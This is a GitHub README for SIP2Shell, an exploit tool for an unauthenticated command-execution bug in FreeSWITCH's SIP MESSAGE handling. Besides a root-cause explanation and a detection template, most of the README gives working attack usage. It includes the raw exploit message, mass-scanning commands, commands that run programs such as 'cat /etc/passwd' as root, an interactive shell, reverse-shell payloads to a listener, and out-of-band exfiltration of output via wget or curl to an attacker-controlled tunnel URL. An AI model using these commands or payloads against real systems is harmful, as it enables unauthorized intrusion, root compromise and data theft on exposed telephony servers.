# SIP2Shell

<p align="center">
  <img src="https://img.shields.io/badge/CVE-2026--116779-d41414?style=flat-square&amp;labelColor=070607" alt="CVE-2026-116779">
  <img src="https://img.shields.io/badge/CVSS-9.8%20critical-d41414?style=flat-square&amp;labelColor=070607" alt="CVSS 9.8 critical">
  <img src="https://img.shields.io/badge/CISA-KEV-d41414?style=flat-square&amp;labelColor=070607" alt="CISA KEV">
  <img src="https://img.shields.io/badge/python-3.8%2B-f0e2c8?style=flat-square&amp;labelColor=070607&amp;logo=python&amp;logoColor=f0e2c8" alt="Python 3.8+">
  <img src="https://img.shields.io/badge/tests-11%20passing-35d0c0?style=flat-square&amp;labelColor=070607" alt="11 tests passing">
  <a href="LICENSE"><img src="https://img.shields.io/badge/license-MIT-f0e2c8?style=flat-square&amp;labelColor=070607" alt="MIT license"></a>
  <a href="https://github.com/DeathShotXD/SIP2Shell/stargazers"><img src="https://img.shields.io/github/stars/DeathShotXD/SIP2Shell?style=flat-square&amp;labelColor=070607&amp;color=f0e2c8" alt="GitHub stars"></a>
</p>

FreeSWITCH will run a command for you if you ask it in a text message.

CVE-2026-116779 is a small mistake with a big blast radius. When a SIP
`MESSAGE` comes in, FreeSWITCH takes the To address, splits it on the first
`+`, and treats the left half as the name of a chat protocol. Whatever follows
the `+` goes to that protocol's handler. One of the registered handlers is
called `api`, and it hands its input straight to `switch_api_execute()`.

So this is not a user:

```text
MESSAGE sip:api+system%20id@target SIP/2.0
```

It is `system id`, run by the daemon. The reply comes back as another MESSAGE,
and because the chat layer is queued, a `202` only means "accepted" - you need
the output to know it actually ran.

<p align="center">
  <img src="assets/logo.png" alt="SIP2Shell logo: a hooded figure on a payphone, red and bone on black" width="320">
</p>

<br>

## What is SIP2Shell?

SIP2Shell is the tool I wanted while digging into this. One Python file, no
dependencies, no `telnet(1)`, no proxy in the middle. It checks whether a host
is old enough to care, runs a command if it is, and gives you the output.
`scan` does it in bulk, `shell` gives you a prompt, `rev` fires reverse-shell
one-liners.

<p align="center">
  <img src="assets/surface.svg" alt="What one command buys you: system, originate, sofia status, xml_locate, module_load, lua" width="100%">
</p>

<br>

> The bug is not a memory corruption. It is a missing allow-list on a chat
> protocol name. That is why a single UDP packet is enough.

<br>

<p align="center">
  <img src="assets/banner.png" alt="SIP2Shell - one message, root. A hooded operator on a payphone beside a FreeSWITCH terminal" width="100%">
</p>

## Why this matters

- **Unauthenticated, pre-auth.** A single UDP packet runs commands.
- **In the wild and KEV.** CISA added it on 2026-11-09; the vendor confirmed
  exploitation.
- **Mass reachable.** Bitsight counted roughly 13,600 exposed FreeSWITCH
  instances in November 2026, and the overwhelming majority were still
  pre-1.11.3. SIP on 5060 is everywhere, on telco and VPS alike.
- **Broad impact.** Command execution, and from there config and credential
  disclosure, arbitrary call control (`originate`), module load, or inline Lua
  via `mod_lua`.

## Demo

<p align="center">
  <img src="assets/demo.gif" alt="SIP2Shell probe and exploit against the 1.10.12 lab container" width="100%">
</p>

A real run against the included `1.10.12` container: `probe` reads the version,
then `exploit` runs `id`, `hostname`, and `uname -sr`. The GIF is rendered from
the captured terminal output, not from a mock; `scripts/make_demo.py` holds the
exact lines.

<p align="center">
  <img src="assets/divider.svg" alt="" width="100%">
</p>

## How the bug works

<p align="center">
  <img src="assets/flow.svg" alt="Attack chain: SIP MESSAGE to sofia presence to api chat proto to switch_api_execute to a shell" width="100%">
</p>

`sofia_presence_handle_sip_i_message()` reads the To user, cuts at the first
`+`, and treats the left side as a protocol name:

```c
/* sofia_presence.c */
if ((p = strchr(to_user, '+')) && p != to_user) {
    switch_copy_string(proto, to_user, sizeof(proto));   /* char proto[512] */
    p = strchr(proto, '+');
    *p++ = '\0';
    ...
}
switch_core_chat_send(proto, event);
```

The dispatch table in `mod_dptools` includes `jingle`, `event`, and `api`. The
`api` entry is the dangerous one:

```c
/* mod_dptools.c */
static switch_status_t api_chat_send(switch_event_t *message_event)
{
    ...
    switch_url_decode(cmd);
    if ((arg = strchr(cmd, ' '))) *arg++ = '\0';
    SWITCH_STANDARD_STREAM(stream);
    switch_api_execute(cmd, arg, NULL, &stream);
    if (proto)
        switch_core_chat_send_args(proto, "api", to, from,
                                   ..., stream.data, ...);
}
```

`switch_api_execute()` is the same dispatcher `fs_cli` and the event socket
run. `system` is a stock API that passes its argument to the shell, so the
whole OS is reachable. `stream.data` carries the output back to the sender -
that is the read-back channel SIP2Shell uses.

The fix adds exactly this, before anything is dispatched:

```c
if (!strcasecmp(proto, "api") &&
    !sofia_test_pflag(profile, PFLAG_ENABLE_CHAT_API_PROTO)) {
    nua_respond(nh, SIP_403_FORBIDDEN, ...);
    return;
}
```

`strcasecmp` because the chat registry is case-insensitive; the parameter is
commented out in the stock profiles. Details and the wire trace are in
[docs/WRITEUP.md](docs/WRITEUP.md).

## Affected

<p align="center">
  <img src="assets/verdict.svg" alt="Status codes: 202 vulnerable, 403 patched, 401/407 auth wall, no answer" width="100%">
</p>

| | |
|---|---|
| Product | SignalWire FreeSWITCH (`mod_sofia` inbound MESSAGE) |
| Versions | **< 1.11.3** on the stock `internal` / `external` profiles |
| Fixed | 1.11.3 - a new `enable-chat-api-proto` gate, **off** by default |
| CVE / CVSS | CVE-2026-116779 / GHSA-mg63-h38w-8p9p - 9.8 |
| Status | CISA KEV, exploited in the wild |
| Gate | `enable-chat-api-proto` is commented out in the stock profiles |

A patched box answers a `MESSAGE` to `api+` with **403**. A vulnerable box
answers **202** and runs the command. A profile that keeps MESSAGE auth answers
**401 or 407**; pass credentials with `--user` / `--password` and the digest
exchange is handled. Stock FreeSWITCH ships users `1000`-`1019` with password `1234` in
the default directory, which is why a lot of lab and default installs answer
without credentials.

## Install

```bash
git clone https://github.com/DeathShotXD/SIP2Shell.git
cd SIP2Shell
python3 sip2shell.py --help
```

Python 3.8+, standard library only. Nothing to install.

## Usage

### Mass scan (UDP by default; `--tcp` for TCP SIP)

```bash
# find vulnerable hosts; 202 = vulnerable, 403 = patched, 401/407 = auth-walled
python3 sip2shell.py scan -f hosts.txt --threads 64
python3 sip2shell.py scan -f hosts.txt --json -o out.json

# from a pipeline
nmap -sU -p 5060 --open -oG - 10.0.0.0/24 | awk '/5060\/open/{print $2}' | \
    python3 sip2shell.py scan
```

### Probe one host

```bash
python3 sip2shell.py probe -t 10.0.0.5
python3 sip2shell.py probe -t 10.0.0.5 --json
```

`probe` sends `OPTIONS` and a `MESSAGE` to `api+version`. A `202` is a lead; it
is only marked confirmed when the reply carries a FreeSWITCH or `mod_sofia`
fingerprint.

### Exploit (get a command back)

```bash
python3 sip2shell.py exploit -t 10.0.0.5 -c "cat /etc/passwd" --post
```

`--post` runs a short recon battery after the first command: `hostname`,
`uname -a`, `id`, and the first lines of `/etc/passwd`.

### Interactive shell

```bash
python3 sip2shell.py shell -t 10.0.0.5
```

### Reverse shells (blind fire)

```bash
nc -lvnp 4444
python3 sip2shell.py rev -t 10.0.0.5 --listen 203.0.113.9:4444
```

Fires `bash`, `nc`, and `python3` payloads as separate MESSAGEs. A 2xx here only
means the MESSAGE was accepted; a shell is proven by your listener, not by the
SIP status.

### Through a SOCKS5 proxy (TCP)

```bash
python3 sip2shell.py probe -t 10.0.0.5 --tcp \
    --proxy socks5://user:pass@127.0.0.1:1080
```

SOCKS5 relays TCP only, so `--tcp` is implied and `--udp` with a proxy is
rejected.

### Behind NAT / on the internet

Read-back (the chat reply) needs the target to route to you. Over the internet,
hand the tool a public callback so it can exfil output out-of-band:

```bash
# free tunnel, no account:
ssh -R 80:localhost:8899 nokey@localhost.run   # prints https://xxxx.lhr.life
python3 sip2shell.py exploit -t 1.2.3.4 --oob-port 8899 \
    --oob-url http://xxxx.lhr.life -c "id"
```

`--oob-url` points the exfil at your public URL; `--oob-ip` / `--oob-port` for
a directly reachable host. `--lhost` advertises a public SIP source. The
exfil command tries `wget`, `curl`, and `busybox wget`, in that order, so
minimal appliances still call back.

## Real lab

<p align="center">
  <img src="assets/lab.svg" alt="A/B lab: 1.10.12 returns uid=0, 1.11.3 returns 403" width="100%">
</p>

```bash
cd lab
./run.sh vuln      # safarov/freeswitch:1.10.12  -> vulnerable
./run.sh patched   # safarov/freeswitch:1.11.3   -> 403 patched
```

Point the tool at the printed `host:5060`. `docker-compose.yml` runs the same
bootstrap as a service (`FS_IMAGE=safarov/freeswitch:1.11.3 docker compose up`).
There is no emulation and no mock server in the loop: the lab is the real
FreeSWITCH image, with host networking and MESSAGE auth off.

## Validation

Validated end-to-end against real FreeSWITCH builds in the included lab:

| Build | `probe` | `exploit -c "id"` | Result |
|---|---|---|---|
| `safarov/freeswitch:1.10.12` | `VULN ... vulnerable v1.10.12` | `202`, output returned | `uid=0(root) gid=0(root) groups=0(root)` |
| `safarov/freeswitch:1.11.3` | `PATCHED 403` | `403 Forbidden` | no command executed |

The unit suite covers the wire encoder, the digest math (RFC 2617 test
vector), the SOCKS5 parser, folded headers, the reverse-shell presets, and the
UDP-plus-proxy guard:

```bash
python3 -m unittest discover -s tests   # 11 tests
```

CI runs the same suite on Python 3.9 through 3.13 (Ubuntu 24.04). The full
source walk-through and the buffer constraints are in
[docs/WRITEUP.md](docs/WRITEUP.md#lab-validation).

## Detection

The included Nuclei template sends `MESSAGE sip:api+version@host` and requires
all three of a `202`, the word `FreeSWITCH`, and `mod_sofia` in the response:

```bash
nuclei -t nuclei/CVE-2026-116779.yaml -u 10.0.0.5:5060
```

Because it insists on the banner, it will not fire on a random SIP service
that happens to answer `202`. It also will not fire on a profile that answers
`401` or `407`; that is a detection gap, not a clean bill of health. The reliable
defensive checks are the version, the `enable-chat-api-proto` setting, and
whether inbound `MESSAGE` is accepted at all.

<p align="center">
  <img src="assets/divider.svg" alt="" width="100%">
</p>

## Repository structure

```text
|-- sip2shell.py            exploit, scanner, probe, shell, rev
|-- docs/WRITEUP.md         root cause, wire trace, constraints, lab notes
|-- lab/                    real vulnerable/patched FreeSWITCH compose
|-- nuclei/                 detection template
|-- tests/                  unit and smoke tests
|-- assets/                 logo, banner, diagrams, demo
|-- scripts/                demo renderer
+-- .github/workflows/      CI (Python 3.9-3.13)
```

## Limits

- The To user is copied into a ~512-byte buffer and the first `+` is special:
  spaces are `%20` and any command `+` is `%2B`. Keep the encoded command under
  ~500 bytes; the tool does.
- The chat layer is an async queue. A `202` proves the MESSAGE was accepted,
  not that the command ran. The output is the proof.
- An auth-walled profile (`401` or `407`) needs valid credentials. The tool
  handles the two-layer `407` then `401` challenge, but it cannot guess the
  password.
- A custom chatplan that delivers `api` with `final_delivery=true` can stop the
  path on some deployments.
- Read-back needs the target to route to you. Behind NAT, use `--oob-url` or a
  public `--oob-ip`; the callback is HTTP, so egress filtering can block it.
- No SIPS/TLS. UDP transport is IPv4; SOCKS5 is TCP only.
- This is not a stealth tool. It sends a small number of packets, but every
  one of them is a log entry.

## Prior art

`hackzuoji/freeswitch-cve-2026-116779-POC` (`fscve`) is a solid, MIT,
stdlib-only toolkit for the same CVE. SIP2Shell differs in a few deliberate
ways:

- **Real A/B lab** (`safarov/freeswitch:1.10.12` vs `1.11.3`) instead of a
  mock-only suite.
- **Read-back plus HTTP OOB** (`wget` / `curl` / `busybox`) with retries, so no
  external DNS zone is required. DNS exfil is fragile because a 63-byte label
  carries only ~30 bytes and hex doubles it.
- **Two-layer auth** (proxy `407` then server `401`) handled correctly.
- **Scan verdicts** distinguish a bare `202` from a confirmed FreeSWITCH
  fingerprint.

Credit to that project for documenting the wire constraints; the underlying
bug is SignalWire's (Orn Arnarson / Gunnlaugur).

## Responsible use

This is working exploit code. Run it **only** against systems you own or have
explicit written permission to test: your own lab, an engagement scope, or an
authorized bug-bounty target. Unauthorized access to third-party systems is
illegal. The author accepts no liability for misuse.

If you find a vulnerable host that is not yours, do not run the exploit.
Report it to the operator or the relevant CERT. See [SECURITY.md](SECURITY.md)
for the boundary and for reporting a problem in SIP2Shell itself.

## References

- SignalWire advisory - GHSA-mg63-h38w-8p9p
- Fix commit - `7015f6a73ab3d67fed5fbfc277ecfb88a74c2a86`
- FreeSWITCH 1.11.3 release notes
- NVD - CVE-2026-116779
- CISA KEV catalog (added 2026-11-09)
- Bitsight - FreeSWITCH exposure footprint (November 2026)
- `hackzuoji/freeswitch-cve-2026-116779-POC` - prior art

## License

MIT - see [LICENSE](LICENSE). Authorized testing only.
